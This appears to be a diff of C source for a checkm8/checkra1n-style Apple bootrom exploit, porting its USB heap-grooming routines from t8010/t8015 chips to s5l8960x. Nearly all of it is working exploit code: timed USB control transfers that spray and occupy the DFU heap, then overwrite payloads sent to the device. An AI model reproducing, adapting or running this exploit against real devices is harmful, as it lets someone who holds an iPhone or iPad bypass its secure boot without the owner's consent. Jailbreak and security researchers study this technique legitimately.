@@ -18,38 +18,18 @@ static int empty(void){
 
 static void heap_spray(io_client_t client){
     IOReturn r;
-    r = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
-    usleep(1000);
+    r = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
+    usleep(100000);
     
-#ifndef IPHONEOS_ARM
-    r = async_usb_ctrl_transfer_with_cancel(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
+    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 65, 1);
+    usleep(10000);
     
-    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
-    DEBUG_("%x\n", r); // kIOUSBTransactionTimeout
-#else
-    // For iOS devices (especially older ones)
-    // Repeat forever until usb_ctrl_transfer(0x80,6,0x304,0x40a,blank,64) reaches Timeout
-    for(int i=0;i<16384;i++){
-        r = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
+    for(int i=0;i<7938;i++){
         r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
-        if(r != 0) break;
     }
-    DEBUG_("%x\n", r);
-#endif
+    usleep(10000);
     
-    for(int i=0;i<64;i++){
-        r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
-    }
-    
-    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
-    
-    for(int i=0;i<16;i++){
-        r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
-    }
-    
-    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
-    
-    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
+    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 65, 1);
     
 }
 
@@ -78,38 +58,40 @@ static void set_global_state(io_client_t client){
     val += 0x40;
     val -= sent;
     
-    DEBUG_("sent: %x\n", sent);
-    DEBUG_("newval: %x\n", val);
-    
     r = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, AAAA, val, 100);
+    
+    heap_spray(client);
     
     r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
     
 }
 
+
+unsigned char yolo[] = {
+    0x79, 0x6f, 0x6c, 0x6f
+};
+
 static void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
     IOReturn r;
     
     r = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
-    usleep(100000);
+    usleep(10000);
     
-    for(int i=0;i<16;i++){
-        //r = async_usb_ctrl_transfer_with_cancel(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 0);
+    for(int i=0;i<3;i++){
         r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
     }
     usleep(10000);
     
     r = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over1, payload.over1_len, 100);
     
-    r = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, AAAA, 512, 100);
+    r = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, yolo, 4, 100);
     
     r = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, payload.over2, payload.over2_len, 100);
-        
-    r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
     
+    //r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
 }
 
-int checkra1n_t8010_t8015(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
+int checkra1n_s5l8960x(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
     int r;
     
     bzero(blank, 2048);
@@ -127,25 +109,12 @@ int checkra1n_t8010_t8015(io_client_t client, uint16_t cpid, checkra1n_payload_t
         LOG_ERROR("ERROR: Failed to reconnect to device");
         return -1;
     }
-    
-    LOG_DEBUG("[checkra1n] running heap_spray()");
-    heap_spray(client);
-    
-    LOG_DEBUG("reconnect");
-    io_reset(client);
-    io_close(client);
-    client = NULL;
-    usleep(10000);
-    get_device_time(&client, 5);
-    if(!client) {
-        LOG_ERROR("ERROR: Failed to reconnect to device");
-        return -1;
-    }
-    
+
     LOG_DEBUG("[checkra1n] running set_global_state()");
     set_global_state(client);
     
     LOG_DEBUG("reconnect");
+    io_reset(client);
     io_close(client);
     client = NULL;
     usleep(10000);
@@ -159,6 +128,7 @@ int checkra1n_t8010_t8015(io_client_t client, uint16_t cpid, checkra1n_payload_t
     heap_occupation(client, cpid, payload);
     
     LOG_DEBUG("reconnect");
+    (*client->handle)->USBDeviceReEnumerate(client->handle, 0);
     io_close(client);
     client = NULL;
     usleep(10000);
